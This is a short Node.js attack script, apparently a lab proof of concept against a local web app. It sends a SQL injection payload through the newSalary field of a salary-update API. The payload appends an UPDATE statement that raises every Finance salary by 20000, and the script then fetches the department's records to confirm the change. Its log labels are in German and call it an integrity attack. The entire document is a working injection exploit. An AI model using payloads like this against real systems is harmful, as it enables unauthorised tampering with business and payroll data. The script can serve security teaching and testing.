async function run() {
  const baseUrl = 'http://localhost:3000';
  const payload = {
    employeeId: '1',
    newSalary: `0; UPDATE employees SET salary = salary + 20000 WHERE department = 'Finance'; --`
  };

  const response = await fetch(`${baseUrl}/api/update-salary`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });

  const body = await response.json();
  console.log('--- Integritätsangriff ---');
  console.log(JSON.stringify(body, null, 2));

  const verify = await fetch(`${baseUrl}/api/employees?department=${encodeURIComponent('Finance')}`);
  const verifyBody = await verify.json();
  console.log('\n--- Nach dem Angriff (Finance Abteilung) ---');
  console.log(JSON.stringify(verifyBody, null, 2));
}

run().catch((error) => {
  console.error('Angriff fehlgeschlagen:', error);
});
